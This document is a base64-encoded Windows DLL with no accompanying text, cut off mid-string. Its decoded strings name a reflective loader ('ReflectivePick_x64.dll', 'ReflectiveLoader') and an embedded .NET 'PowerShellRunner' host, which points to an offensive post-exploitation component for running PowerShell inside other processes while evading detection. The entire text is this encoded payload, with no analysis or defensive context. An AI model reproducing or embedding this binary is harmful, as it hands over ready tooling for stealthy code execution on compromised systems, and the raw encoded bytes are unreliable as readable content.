AQCA6gEAAAAAAAAAAAAAAAAAEAAAAGBBAgAAAAAA/////wAAAAAYAAAAmCIAAAAAAAAAAAAAAAAAAAAAAACIQQIAAAAAAP////8AAAAAGAAAAFgjAAAAAAAAAAAAAAAAAAAAAAAAkCMAAAAAAADI6gEAAAAAAAAAAAAAAAAAAAAAAAMAAADo6gEAWOoBAIDqAQAAAAAAAAAAAAAAAAAAAAAAAAAAALBBAgAAAAAA/////wAAAAAYAAAA+CIAAAAAAAAAAAAAAAAAAAAAAABwLwAAAAAAADDrAQAAAAAAAAAAAAAAAAAAAAAAAQAAAEDrAQAAAAAAAAAAAAAAAAAAQgIAAAAAAP////8AAAAAIAAAAKAuAAAAAAAAAAAAAAAAAAAAAAAAkCMAAAAAAACI6wEAAAAAAAAAAAAAAAAAAAAAAAIAAACg6wEAgOoBAAAAAAAAAAAAAAAAAAAAAAAoQgIAAAAAAP////8AAAAAGAAAAABKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgKFYAAAAAAzsAQABAAAAAgAAAAIAAAD46wEAAOwBAAjsAQBAEAAAmBUAACPsAQA07AEAAAABAFJlZmxlY3RpdmVQaWNrX3g2NC5kbGwAUmVmbGVjdGl2ZUxvYWRlcgBWb2lkRnVuYwAAAADA7gEAAAAAAAAAAAAo7wEAMEIBABjvAQAAAAAAAAAAAErvAQCIQgEAkOwBAAAAAAAAAAAAWvQBAABAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAHLyAQAAAAAATPQBAAAAAAA89AEAAAAAAC70AQAAAAAAGvQBAAAAAAAM9AEAAAAAAAD0AQAAAAAA7vMBAAAAAADe8wEAAAAAAFbvAQAAAAAAau8BAAAAAACE7wEAAAAAAJjvAQAAAAAAtO8BAAAAAADS7wEAAAAAAObvAQAAAAAA+u8BAAAAAAAW8AEAAAAAADDwAQAAAAAARvABAAAAAABc8AEAAAAAAHbwAQAAAAAAjPABAAAAAACg8AEAAAAAALLwAQAAAAAAxvABAAAAAADW8AEAAAAAAOzwAQAAAAAAAvEBAAAAAAAO8QEAAAAAABzxAQAAAAAAMPEBAAAAAABC8QEAAAAAAFrxAQAAAAAAavEBAAAAAACC8QEAAAAAAJrxAQAAAAAAsvEBAAAAAADa8QEAAAAAAObxAQAAAAAA9PEBAAAAAAAC8gEAAAAAAAzyAQAAAAAAGvIBAAAAAAAs8gEAAAAAAD7yAQAAAAAATvIBAAAAAABc8gEAAAAAANLzAQAAAAAAiPIBAAAAAACU8gEAAAAAAKDyAQAAAAAAqvIBAAAAAAC68gEAAAAAAMjyAQAAAAAA2PIBAAAAAADk8gEAAAAAAPjyAQAAAAAACPMBAAAAAAAa8wEAAAAAACbzAQAAAAAAMvMBAAAAAABE8wEAAAAAAFbzAQAAAAAAcPMBAAAAAACK8wEAAAAAAJzzAQAAAAAArvMBAAAAAAC+8wEAAAAAAAAAAAAAAAAAEAAAAAAAAIAaAAAAAAAAgJsBAAAAAACAFgAAAAAAAIAVAAAAAAAAgA8AAAAAAACACQAAAAAAAIAIAAAAAAAAgAYAAAAAAACAAgAAAAAAAIAAAAAAAAAAADbvAQAAAAAAAAAAAAAAAABPTEVBVVQzMi5kbGwAAAAAQ0xSQ3JlYXRlSW5zdGFuY2UAbXNjb3JlZS5kbGwArgRSdGxDYXB0dXJlQ29udGV4dAC1BFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAALwEUnRsVmlydHVhbFVud2luZAAAkgVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAFIFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAA8CR2V0Q3VycmVudFByb2Nlc3MAcAVUZXJtaW5hdGVQcm9jZXNzAABwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAMARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAQAkdldEN1cnJlbnRQcm9jZXNzSWQAFAJHZXRDdXJyZW50VGhyZWFkSWQAAN0CR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAVANJbml0aWFsaXplU0xpc3RIZWFkAGoDSXNEZWJ1Z2dlclByZXNlbnQAxQJHZXRTdGFydHVwSW5mb1cAbQJHZXRNb2R1bGVIYW5kbGVXAABWAkdldExhc3RFcnJvcgAA1ANNdWx0aUJ5dGVUb1dpZGVDaGFyAN0FV2lkZUNoYXJUb011bHRpQnl0ZQC1A0xvY2FsRnJlZQC7BFJ0bFVud2luZEV4ALcEUnRsUGNUb0ZpbGVIZWFkZXIARARSYWlzZUV4Y2VwdGlvbgAAWANJbnRlcmxvY2tlZEZsdXNoU0xpc3QAGQVTZXRMYXN0RXJyb3IAACkBRW50ZXJDcml0aWNhbFNlY3Rpb24AAKUDTGVhdmVDcml0aWNhbFNlY3Rpb24AAAYBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAFEDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudACCBVRsc0FsbG9jAACEBVRsc0dldFZhbHVlAIUFVGxzU2V0VmFsdWUAgwVUbHNGcmVlAKQBRnJlZUxpYnJhcnkApAJHZXRQcm9jQWRkcmVzcwAAqgNMb2FkTGlicmFyeUV4VwAAJQFFbmNvZGVQb2ludGVyAFcBRXhpdFByb2Nlc3MAbAJHZXRNb2R1bGVIYW5kbGVFeFcAAGgCR2V0TW9kdWxlRmlsZU5hbWVBAAA8A0hlYXBGcmVlAAA4A0hlYXBBbGxvYwCqAUdldEFDUAAAxwJHZXRTdGRIYW5kbGUAAEUCR2V0RmlsZVR5cGUAmQNMQ01hcFN0cmluZ1cAAG4BRmluZENsb3NlAHMBRmluZEZpcnN0RmlsZUV4QQAAgwFGaW5kTmV4dEZpbGVBAHUDSXNWYWxpZENvZGVQYWdlAI0CR2V0T0VNQ1AAALkBR2V0Q1BJbmZvAM4BR2V0Q29tbWFuZExpbmVBAM8BR2V0Q29tbWFuZExpbmVXAC4CR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAowFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwCpAkdldFByb2Nlc3NIZWFwAADMAkdldFN0cmluZ1R5cGVXAAAwBVNldFN0ZEhhbmRsZQAAmAFGbHVzaEZpbGVCdWZmZXJzAADxBVdyaXRlRmlsZQDiAUdldENvbnNvbGVDUAAA9AFHZXRDb25zb2xlTW9kZQAAQQNIZWFwU2l6ZQAAPwNIZWFwUmVBbGxvYwAMBVNldEZpbGVQb2ludGVyRXgAAH8AQ2xvc2VIYW5kbGUA8AVXcml0ZUNvbnNvbGVXAMIAQ3JlYXRlRmlsZVcAS0VSTkVMMzIuZGxsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P///////wAAAAABAAAAAgAAAC8gAAAAAAAAAAAAAAAAAAAgMACAAQAAAAoAAAAAAAAABAACgAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAADAAAAAgAAAD/////AAAAAAAAAACAYQGAAQAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADoAgKAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOgCAoABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AICgAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADoAgKAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOgCAoABAAAAAAAAAAAA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AAAFAAARAAJ7AgAABAorAAYqEzABABAAAAAGAAARACgfAAAKbyAAAAoKKwAGKhMwAQAQAAAABgAAEQAoHwAACm8hAAAKCisABioyAHIzAABwcyIAAAp6MgByrAEAcHMiAAAKehIAKwAqEgArACoSACsAKnoCKCMAAAp9AQAABAJzDwAABn0CAAAEAigkAAAKACqCAnM7AAAGfQQAAAQCKCUAAAoAAAJzJgAACn0DAAAEACo+AAJ7AwAABAVvJwAACiYqTgACewMAAARyIwMAcG8nAAAKJipmAAJ7AwAABAVyIwMAcCgoAAAKbycAAAomKj4AAnsDAAAEA28nAAAKJipmAAJ7AwAABHInAwBwAygoAAAKbykAAAomKmYAAnsDAAAEcjcDAHADKCgAAApvKQAACiYqPgACewMAAAQDbykAAAomKmYAAnsDAAAEckcDAHADKCgAAApvKQAACiYqZgACewMAAARyWwMAcAMoKAAACm8pAAAKJioSACsAKhMwAQARAAAAAwAAEQACewMAAARvKgAACgorAAYqMgBybwMAcHMiAAAKejIActIEAHBzIgAACnoyAHJHBgBwcyIAAAp6MgByxgcAcHMiAAAKegAAABMwAQAMAAAABwAAEQACewQAAAQKKwAGKjIAckUJAHBzIgAACnoyAHKsCgBwcyIAAAp6AAATMAEADAAAAAgAABEAAnsJAAAECisABiomAAIDfQkAAAQqAAATMAEADAAAAAkAABEAAnsMAAAECisABiomAAIDfQwAAAQqAAATMAEADAAAAAoAABEAAnsGAAAECisABiomAAIDfQYAAAQqAAATMAEADAAAAAsAABEAAnsHAAAECisABiomAAIDfQcAAAQqMgByLwwAcHMiAAAKegATMAEADAAAAAgAABEAAnsIAAAECisABiomAAIDfQgAAAQqMgByeQwAcHMiAAAKejIAcsUMAHBzIgAACnoTMAEADAAAAAkAABEAAnsKAAAECisABioTMAEADAAAAAkAABEAAnsLAAAECisABioyAHIHDQBwcyIAAAp6MgBybA4AcHMiAAAKejIAcrwOAHBzIgAACnoyAHIIDwBwcyIAAAp6EzABAAwAAAAKAAARAAJ7DQAABAorAAYqJgACA30NAAAEKgAAEzABAAwAAAAJAAARAAJ7BQAABAorAAYqJgACA30F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agAzADAlAAAAAIYYBgEYADQAAAABAB4HAAABACYHAAABAC8HAAACAD8HAAADAE8HAAABAC8HAAACAD8HAAADAE8HAAABAE8HAAABAFUHAAABAE8HAAABAE8HAAABAFUHAAABAFUHAAABAF0HAAACAGYHAAABAG0HAAACAFUHAAADAHUHAAABAG0HAAACAFUHAAADAIIHAAAEAIoHAAABAG0HAAACAFUHAAADAJgHAAAEAKEHAAAFAKwHAAAGAMMHAAABAG0HAAACAFUHAAADAJgHAAAEAKEHAAABAE8HAAABAE8HAAABAE8HAAABAE8HAAABAE8HAAABAMsHAAABAMMHAAABANUHAAACANwHAAADAOgHAAAEAO0HAAABAMsHAAACAO0HAAABAPIHAAACAPkHAAABAE8HAAABAE8HAAABAE8H0QAGAWoA2QAGAWoA4QAGAWoA6QAGAWoA8QAGAWoA+QAGAWoAAQEGAWoACQEGAWoAEQEGAUIBGQEGAWoAIQEGAWoAKQEGAWoAMQEGAUcBQQEGATwASQEGARgAUQEuCk4BUQFRClQBYQGDClsBaQGSChgAaQGgCmYBcQHBCmwBeQHOCmoADADgCnoBgQH9CoABeQEMC2oAcQEQC4oBkQEjCxgAEQBJATIACQAGARgAMQAGAa0BmQFDC70BmQFxATcAmQGEATcAoQEGAWoAKQBtC8gBEQAGARgAGQAGARgAQQAGARgAQQB1C80BqQGDC9MBQQCKC80BCQCVCykAoQCeCzwAoQCoCzwAqQCzCzwAqQC5CzwAIQAGARgALgALAAACLgATABYCLgAbABYCLgAjABYCLgArAAACLgAzABwCLgA7ABYCLgBLABYCLgBTADQCLgBjAF4CLgBrAGsCLgBzAHQCLgB7AH0CkwGkAakBswG4AcMB2QHeAeMB6AHtAfEBAwABAAQABwAFAAkAAAD2AUEAAAABAkYAAAA1AUoAAAAGAk8AAAAJAlQAAAAYAlQAAAD6A0YAAAABBLUAAACCBisBAACSBjABAACdBjUBAACsBjoBAAC3BisBAADHBj4BAADUBjABAADqBjABAAD4BjUBAAAHBzABAAASB0YAAgADAAMAAgAEAAUAAgAFAAcAAgAGAAkAAgAHAAsAAgAIAA0AAgAaAA8AAgAfABEAAgAiABMAAQAjABMAAgAkABUAAQAlABUAAQAnABcAAgAmABcAAQApABkAAgAoABkAAgArABsAAQAsABsAAgAuAB0AAgAvAB8AAgAwACEAAgA1ACMAAQA2ACMAAgA3ACUAAQA4ACUAAgA5ACcAAQA6ACcAcgEEgAAAAQAAAAAAAAAAAAAAAAAfAAAAAgAAAAAAAAAAAAAAAQB1AAAAAAABAAAAAAAAAAAAAAAKAIwAAAAAAAMAAgAEAAIABQACAAAAADxNb2R1bGU+AFBvd2VyU2hlbGxSdW5uZXIuZGxsAFBvd2VyU2hlbGxSdW5uZXIAQ3VzdG9tUFNIb3N0AEN1c3RvbVBTSG9zdFVzZXJJbnRlcmZhY2UAQ3VzdG9tUFNSSG9zdFJhd1VzZXJJbnRlcmZhY2UAbXNjb3JsaWIAU3lzdGVtAE9iamVjdABTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdABQU0hvc3QAUFNIb3N0VXNlckludGVyZmFjZQBQU0hvc3RSYXdVc2VySW50ZXJmYWNlAEludm9rZVBTAC5jdG9yAEd1aWQAX2hvc3RJZABfdWkAZ2V0X0luc3RhbmNlSWQAZ2V0X05hbWUAVmVyc2lvbgBnZXRfVmVyc2lvbgBnZXRfVUkAU3lzdGVtLkdsb2JhbGl6YXRpb24AQ3VsdHVyZUluZm8AZ2V0X0N1cnJlbnRDdWx0dXJlAGdldF9DdXJyZW50VUlDdWx0dXJlAEVudGVyTmVzdGVkUHJvbXB0AEV4aXROZXN0ZWRQcm9tcHQATm90aWZ5QmVnaW5BcHBsaWNhdGlvbgBOb3RpZnlFbmRBcHBsaWNhdGlvbgBTZXRTaG91bGRFeGl0AEluc3RhbmNlSWQATmFtZQBVSQBDdXJyZW50Q3VsdHVyZQBDdXJyZW50VUlDdWx0dXJlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAX3NiAF9yYXdVaQBDb25zb2xlQ29sb3IAV3JpdGUAV3JpdGVMaW5lAFdyaXRlRGVidWdMaW5lAFdyaXRlRXJyb3JMaW5lAFdyaXRlVmVyYm9zZUxpbmUAV3JpdGVXYXJuaW5nTGluZQBQcm9ncmVzc1JlY29yZABXcml0ZVByb2dyZXNzAGdldF9PdXRwdXQAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMARGljdGlvbmFyeWAyAFBTT2JqZWN0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEARmllbGREZXNjcmlwdGlvbgBQcm9tcHQAQ2hvaWNlRGVzY3JpcHRpb24AUHJvbXB0Rm9yQ2hvaWNlAFBTQ3JlZGVudGlhbABQU0NyZWRlbnRpYWxUeXBlcwBQU0NyZWRlbnRpYWxVSU9wdGlvbnMAUHJvbXB0Rm9yQ3JlZGVudGlhbABnZXRfUmF3VUkAUmVhZExpbmUAU3lzdGVtLlNlY3VyaXR5AFNlY3VyZVN0cmluZwBSZWFkTGluZUFzU2VjdXJlU3RyaW5nAE91dHB1dABSYXdVSQBTaXplAF93aW5kb3dTaXplAENvb3JkaW5hdGVzAF9jdXJzb3JQb3NpdGlvbgBfY3Vyc29yU2l6ZQBfZm9yZWdyb3VuZENvbG9yAF9iYWNrZ3JvdW5kQ29sb3IAX21heFBoeXNpY2FsV2luZG93U2l6ZQBfbWF4V2luZG93U2l6ZQBfYnVmZmVyU2l6ZQBfd2luZG93UG9zaXRpb24AX3dpbmRvd1RpdGxlAGdldF9CYWNrZ3JvdW5kQ29sb3IAc2V0X0JhY2tncm91bmRDb2xvcgBnZXRfQnVmZmVyU2l6ZQBzZXRfQnVmZmVyU2l6ZQBnZXRfQ3Vyc29yUG9zaXRpb24Ac2V0X0N1cnNvclBvc2l0aW9uAGdldF9DdXJzb3JTaXplAHNldF9DdXJzb3JTaXplAEZsdXNoSW5wdXRCdWZmZXIAZ2V0X0ZvcmVncm91bmRDb2xvcgBzZXRfRm9yZWdyb3VuZENvbG9yAEJ1ZmZlckNlbGwAUmVjdGFuZ2xlAEdldEJ1ZmZlckNvbnRlbnRzAGdldF9LZXlBdmFpbGFibGUAZ2V0X01heFBoeXNpY2FsV2luZG93U2l6ZQBnZXRfTWF4V2luZG93U2l6ZQBLZXlJbmZvAFJlYWRLZXlPcHRpb25zAFJlYWRLZXkAU2Nyb2xsQnVmZmVyQ29udGVudHMAU2V0QnVmZmVyQ29udGVudHMAZ2V0X1dpbmRvd1Bvc2l0aW9uAHNldF9XaW5kb3dQb3NpdGlvbgBnZXRfV2luZG93U2l6ZQBzZXRfV2luZG93U2l6ZQBnZXRfV2luZG93VGl0bGUAc2V0X1dpbmRvd1RpdGxlAEJhY2tncm91bmRDb2xvcgBCdWZmZXJTaXplAEN1cnNvclBvc2l0aW9uAEN1cnNvclNpemUARm9yZWdyb3VuZENvbG9yAEtleUF2YWlsYWJsZQBNYXhQaHlzaWNhbFdpbmRvd1N